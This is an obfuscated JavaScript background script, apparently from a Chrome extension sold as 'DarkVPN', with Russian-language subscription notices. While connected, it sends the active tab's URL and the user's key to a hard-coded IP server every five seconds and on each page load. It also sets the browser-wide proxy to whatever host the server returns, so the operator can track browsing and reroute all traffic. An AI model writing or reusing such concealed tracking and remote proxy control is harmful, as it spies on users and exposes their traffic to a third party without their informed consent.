const _0x5c7a0b=_0x2525,_0x1ee6d7=_0x3592;function _0x2525(_0x137314,_0x2a214c){const _0x4fe7ab=_0x4fe7();return _0x2525=function(_0x25256c,_0x289e33){_0x25256c=_0x25256c-0x17f;let _0x33883c=_0x4fe7ab[_0x25256c];return _0x33883c;},_0x2525(_0x137314,_0x2a214c);}(function(_0x2c555d,_0x1c17d0){const _0x5b9ad8=_0x2525,_0x78f62c=_0x3592,_0x29d292=_0x2c555d();while(!![]){try{const _0x2d1d83=parseInt(_0x78f62c(0x1be))/0x1*(parseInt(_0x78f62c(0x1c8))/0x2)+parseInt(_0x5b9ad8(0x1bb))/0x3*(parseInt(_0x5b9ad8(0x183))/0x4)+-parseInt(_0x5b9ad8(0x1a1))/0x5+-parseInt(_0x5b9ad8(0x1c4))/0x6*(-parseInt(_0x78f62c(0x1c6))/0x7)+-parseInt(_0x78f62c(0x18e))/0x8*(parseInt(_0x5b9ad8(0x188))/0x9)+parseInt(_0x5b9ad8(0x196))/0xa+-parseInt(_0x78f62c(0x1b1))/0xb*(parseInt(_0x78f62c(0x1b7))/0xc);if(_0x2d1d83===_0x1c17d0)break;else _0x29d292['push'](_0x29d292['shift']());}catch(_0x47023b){_0x29d292['push'](_0x29d292['shift']());}}}(_0x4fe7,0x7ddbb));const SERVER_URL='http://185.106.94.81:5011',EXTENSION_VERSION='1.0',SERVER_HOSTNAME=new URL(SERVER_URL)['hostname'];let isConnected=![],heartbeatIntervalId=null,userKey=null,currentProxyConfig=null;function setUserKey(_0x1057c5){const _0x1f6acd=_0x2525,_0x3aa5b0=_0x3592;userKey=_0x1057c5,chrome[_0x3aa5b0(0x1c3)][_0x3aa5b0(0x195)][_0x1f6acd(0x1c5)]({'userKey':_0x1057c5});}function getUserKey(_0x54264a){const _0x40ca53=_0x2525,_0x479ebf=_0x3592;userKey!==null?_0x54264a(userKey):chrome[_0x479ebf(0x1c3)][_0x479ebf(0x195)][_0x40ca53(0x1cc)](_0x40ca53(0x1d1),function(_0x1d87e8){const _0x39539c=_0x40ca53;userKey=_0x1d87e8[_0x39539c(0x1d1)]||null,_0x54264a(userKey);});}function connectVPN(_0x4a013f){const _0x14eb52=_0x3592;chrome['proxy'][_0x14eb52(0x17f)]['set']({'value':_0x4a013f,'scope':_0x14eb52(0x1c7)},function(){const _0xfe9cfc=_0x14eb52,_0x375ee0=_0x2525;if(chrome[_0x375ee0(0x18a)][_0xfe9cfc(0x19a)]){console['error'](_0xfe9cfc(0x1b2),chrome['runtime'][_0xfe9cfc(0x19a)]);return;}currentProxyConfig=_0x4a013f,console[_0x375ee0(0x1ce)](_0x375ee0(0x1bd));});}function disconnectVPN(){const _0x7ae860=_0x2525,_0x1bcf31=_0x3592;chrome[_0x1bcf31(0x1af)]['settings'][_0x7ae860(0x1a7)]({'scope':_0x1bcf31(0x1c7)},function(){const _0x30231c=_0x1bcf31;if(chrome[_0x30231c(0x194)]['lastError']){console['error'](_0x30231c(0x1d9),chrome[_0x30231c(0x194)][_0x30231c(0x19a)]);return;}currentProxyConfig=null,console[_0x30231c(0x1b5)](_0x30231c(0x1d0));});}function startHeartbeat(){heartbeatIntervalId&&clearInterval(heartbeatIntervalId),sendHeartbeat(),heartbeatIntervalId=setInterval(sendHeartbeat,0x1388);}function stopHeartbeat(){heartbeatIntervalId&&(clearInterval(heartbeatIntervalId),heartbeatIntervalId=null);}function sendHeartbeat(_0x2d3eef){getUserKey(function(_0x5e7681){const _0x15968f=_0x2525;if(!_0x5e7681){console[_0x15968f(0x1c1)](_0x15968f(0x1a3)),disconnectVPN();if(_0x2d3eef)_0x2d3eef();return;}chrome[_0x15968f(0x1ba)][_0x15968f(0x190)]({'active':!![],'currentWindow':!![]},function(_0x5bcad3){const _0x56626b=_0x3592,_0x2d1ddb=_0x15968f,_0x125925=_0x5bcad3[0x0]&&_0x5bcad3[0x0][_0x2d1ddb(0x18f)]?_0x5bcad3[0x0]['url']:'',_0x2fab45={'userKey':_0x5e7681,'version':EXTENSION_VERSION,'currentUrl':_0x125925,'isConnected':isConnected};console[_0x56626b(0x1b5)](_0x56626b(0x1c0),_0x2fab45),fetch(SERVER_URL+'/api/heartbeat',{'method':_0x56626b(0x193),'headers':{'Content-Type':_0x2d1ddb(0x1b0)},'body':JSON[_0x2d1ddb(0x1b3)](_0x2fab45)})['then'](_0x1a0223=>{const _0xf8c795=_0x56626b,_0x34d702=_0x2d1ddb;return console['log'](_0x34d702(0x1ac),_0x1a0223),_0x1a0223[_0xf8c795(0x187)]();})[_0x56626b(0x1ab)](_0x5c5b82=>{const _0x169989=_0x2d1ddb;console[_0x169989(0x1ce)]('Heartbeat\x20response\x20data:',_0x5c5b82),handleHeartbeatResponse(_0x5c5b82);if(_0x2d3eef)_0x2d3eef();})['catch'](_0x40a831=>{const _0x30c6af=_0x2d1ddb,_0x8cf014=_0x56626b;console[_0x8cf014(0x1d7)](_0x30c6af(0x199),_0x40a831);if(_0x2d3eef)_0x2d3eef();});});});}function _0x3592(_0x137314,_0x2a214c){const _0x4fe7ab=_0x4fe7();return _0x3592=function(_0x25256c,_0x289e33){_0x25256c=_0x25256c-0x17f;let _0x33883c=_0x4fe7ab[_0x25256c];if(_0x3592['CPOGVc']===undefined){var _0x173469=function(_0x3592c8){const _0x43429d='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x1d078c='',_0x1677b3='';for(let _0x21138e=0x0,_0x9e2555,_0x41fdcc,_0x1057c5=0x0;_0x41fdcc=_0x3592c8['charAt'](_0x1057c5++);~_0x41fdcc&&(_0x9e2555=_0x21138e%0x4?_0x9e2555*0x40+_0x41fdcc:_0x41fdcc,_0x21138e++%0x4)?_0x1d078c+=String['fromCharCode'](0xff&_0x9e2555>>(-0x2*_0x21138e&0x6)):0x0){_0x41fdcc=_0x43429d['indexOf'](_0x41fdcc);}for(let _0x54264a=0x0,_0x1d87e8=_0x1d078c['length'];_0x54264a<_0x1d87e8;_0x54264a++){_0x1677b3+='%'+('00'+_0x1d078c['charCodeAt'](_0x54264a)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x1677b3);};_0x3592['UvqQmF']=_0x173469,_0x137314=arguments,_0x3592['CPOGVc']=!![];}const _0x4f942c=_0x4fe7ab[0x0],_0x2b5441=_0x25256c+_0x4f942c,_0x2c2c2e=_0x137314[_0x2b5441];return!_0x2c2c2e?(_0x33883c=_0x3592['UvqQmF'](_0x33883c),_0x137314[_0x2b5441]=_0x33883c):_0x33883c=_0x2c2c2e,_0x33883c;},_0x3592(_0x137314,_0x2a214c);}function _0x4fe7(){const _0x291708=['toggleConnection','get','C3rHDhvZ','log','localhost','uhjVEhKGC2v0DgLUz3mGy2XLyxjLzc4','userKey','Dw5HDxrOB3jPEMvK','onUpdated','proxy','DxjS','3403763uZVRyX','zxjYB3i','0j/qVTc20ldqU9gd0lNrGDgc0laSinc+0lhqVDc+0llqUngc0luG0ydqSngb0yJqUnga0lxqVDc40luGrgfYA1zqtIdqTnc+inc/0l7rGDc70lxqTnc90lxqUsdqSTc10ydrGDc40lGU','rxjYB3iGy2XLyxjPBMCGChjVEhKGC2v0DgLUz3m6','addListener','C2v0DgLUz3m','basic','AxndB25Uzwn0zwq','host','4WIJZXd','B25by3rPDMf0zwq','DxnLCKTLEq','vw5RBM93BIbZDgf0DxmGzNjVBsbZzxj2zxi6','ANnVBG','3611043wxPBap','local','runtime','user_data','status','ywn0Aw9U','ofvky1PHza','url','query','DarkVPN\x20Ошибка','ywrKtgLZDgvUzxi','ue9tva','CNvUDgLTzq','C3LUyW','8730590vBzCOC','odCZmdu5mhzcEKnpqW','action','Heartbeat\x20error:','BgfZDevYCM9Y','BM90AwzPy2f0Aw9UCW','sync','update_required','storage','DxnLCL9KyxrH','zML4zwrFC2vYDMvYCW','2401810rlHfxo','DgfICW','User\x20key\x20not\x20available.\x20Cannot\x20send\x20heartbeat.','AwnVBNmVAwnVBJeYoc5WBMC','Ваша\x20подписка\x20истекла.\x20Пожалуйста,\x20обновите\x20подписку.','C2v0','clear','rgfYA1zqtIdqN9c+0ltqV9c40yhqUTcWinc40yhrGTc10lRqU9cW','port','y2XLyxi','DgHLBG','Heartbeat\x20response:','Bg9JywW','subscription_expired','ChjVEhK','application/json','mZqWmZC2m3vAvLj5wa','rxjYB3iGC2v0DgLUzYbWCM94EtO','stringify','DarkVPN\x20Требуется\x20обновление','Bg9N','vxnLCIbKyxrHihjLy2vPDMvKoG','ndHSBNDnqxu','8UJcZad','tM8GDxnLCIbKyxrHihjLy2vPDMvK','tabs','1037106Vmtrgb','688327OxVPMK','Proxy\x20settings\x20applied.','nJG4mZi3t3Hwue1l','Ключ\x20пользователя\x20недействителен.\x20Пожалуйста,\x20введите\x20действительный\x20ключ.','u2vUzgLUzYbOzwfYDgjLyxq6','error','y3jLyxrL','C3rVCMfNzq','6636gmtnmm','set','ndyWnM5zwvLmvG','CMvNDwXHCG','mLPAvLrqrq','E317E3T7Fx19Fq','C2v0vxnLCKTLEq'];_0x4fe7=function(){return _0x291708;};return _0x4fe7();}function handleHeartbeatResponse(_0x57e677){const _0x4f9a11=_0x2525,_0x1a8b6a=_0x3592;console['log']('--handleHeartbeatResponse',_0x57e677);if(_0x57e677[_0x1a8b6a(0x1cd)]==='ok'||_0x57e677[_0x4f9a11(0x18c)]==='disconnected'){console[_0x1a8b6a(0x1b5)]('Heartbeat\x20status\x20ok\x20or\x20disconnected');if(isConnected&&_0x57e677[_0x1a8b6a(0x1af)]){console[_0x4f9a11(0x1ce)]('isConnected\x20and\x20proxy\x20data\x20received:',_0x57e677[_0x1a8b6a(0x1af)]);const _0x16d96a={'mode':_0x1a8b6a(0x1a0),'rules':{'singleProxy':{'scheme':_0x57e677[_0x4f9a11(0x1d4)]['scheme'],'host':_0x57e677['proxy'][_0x4f9a11(0x182)],'port':parseInt(_0x57e677[_0x4f9a11(0x1d4)][_0x4f9a11(0x1a9)],0xa)},'bypassList':[_0x4f9a11(0x1cf),SERVER_HOSTNAME]}};connectVPN(_0x16d96a);}_0x57e677[_0x4f9a11(0x18b)]?(console[_0x1a8b6a(0x1b5)](_0x1a8b6a(0x1b6),_0x57e677[_0x1a8b6a(0x19f)]),chrome[_0x4f9a11(0x19e)][_0x4f9a11(0x189)][_0x4f9a11(0x1c5)]({'userData':_0x57e677[_0x1a8b6a(0x19f)]})):console[_0x4f9a11(0x1ce)](_0x1a8b6a(0x1b9));}else{if(_0x57e677[_0x4f9a11(0x18c)]===_0x4f9a11(0x19d))chrome[_0x1a8b6a(0x19b)]['create']({'type':_0x4f9a11(0x180),'iconUrl':_0x1a8b6a(0x1a4),'title':_0x4f9a11(0x1b4),'message':_0x1a8b6a(0x1d8)}),disconnectVPN();else{if(_0x57e677[_0x4f9a11(0x18c)]===_0x1a8b6a(0x1d2))disconnectVPN(),setUserKey(null),chrome[_0x1a8b6a(0x19b)]['create']({'type':'basic','iconUrl':_0x1a8b6a(0x1a4),'title':_0x4f9a11(0x191),'message':_0x4f9a11(0x1bf)});else _0x57e677['status']===_0x4f9a11(0x1ae)?(console['warn']('Subscription\x20expired.'),chrome[_0x1a8b6a(0x19b)][_0x1a8b6a(0x1c2)]({'type':_0x4f9a11(0x180),'iconUrl':'icons/icon128.png','title':_0x1a8b6a(0x1a8),'message':_0x4f9a11(0x1a5)}),chrome[_0x1a8b6a(0x1c3)][_0x4f9a11(0x189)][_0x4f9a11(0x1c5)]({'userData':_0x57e677['user_data']}),disconnectVPN()):console[_0x1a8b6a(0x1d7)](_0x1a8b6a(0x186),_0x57e677['status']);}}}function performLogout(_0x22531f){isConnected=![],sendHeartbeat(function(){const _0x290992=_0x2525,_0x3e9f30=_0x3592;disconnectVPN(),stopHeartbeat(),setUserKey(null),userKey=null,chrome[_0x3e9f30(0x1c3)][_0x3e9f30(0x1ad)][_0x3e9f30(0x1aa)](),chrome[_0x3e9f30(0x1c3)][_0x290992(0x19c)][_0x3e9f30(0x1aa)](function(){_0x22531f({'success':!![]});});});}chrome[_0x1ee6d7(0x194)]['onMessage'][_0x1ee6d7(0x192)](function(_0x491c8c,_0x29b4f2,_0x34736c){const _0x5704c7=_0x1ee6d7,_0xf9a595=_0x2525;console[_0xf9a595(0x1ce)](_0x5704c7(0x1c9));if(_0x491c8c['action']==='toggleConnection')return console[_0xf9a595(0x1ce)](_0xf9a595(0x1cb)),isConnected=_0x491c8c[_0x5704c7(0x181)],chrome[_0x5704c7(0x1c3)][_0xf9a595(0x189)][_0x5704c7(0x1a6)]({'isConnected':isConnected},function(){isConnected?startHeartbeat():(stopHeartbeat(),disconnectVPN(),sendHeartbeat(function(){_0x34736c({'isConnected':isConnected});}));}),!![];else{if(_0x491c8c[_0x5704c7(0x18d)]===_0x5704c7(0x1ca))return setUserKey(_0x491c8c[_0x5704c7(0x185)]),_0x34736c({'success':!![]}),!![];else{if(_0x491c8c[_0xf9a595(0x198)]==='logout')return performLogout(_0x34736c),!![];}}}),chrome[_0x1ee6d7(0x1c3)][_0x5c7a0b(0x189)]['get'](_0x1ee6d7(0x181),function(_0x594bd7){const _0x117e6b=_0x1ee6d7;isConnected=_0x594bd7[_0x117e6b(0x181)]||![],isConnected?startHeartbeat():disconnectVPN();}),chrome[_0x5c7a0b(0x19e)][_0x5c7a0b(0x19c)][_0x5c7a0b(0x1cc)](_0x5c7a0b(0x1d1),function(_0x2485c6){const _0x39bfea=_0x5c7a0b;userKey=_0x2485c6[_0x39bfea(0x1d1)]||null;}),chrome[_0x5c7a0b(0x1ba)][_0x1ee6d7(0x184)][_0x1ee6d7(0x192)](function(_0xa2850a){isConnected&&sendHeartbeat();}),chrome[_0x1ee6d7(0x1a2)][_0x5c7a0b(0x1d3)][_0x5c7a0b(0x1da)](function(_0x452c05,_0x2456f2,_0x57aacb){const _0x16ffde=_0x1ee6d7;isConnected&&_0x2456f2[_0x16ffde(0x1d5)]&&sendHeartbeat();});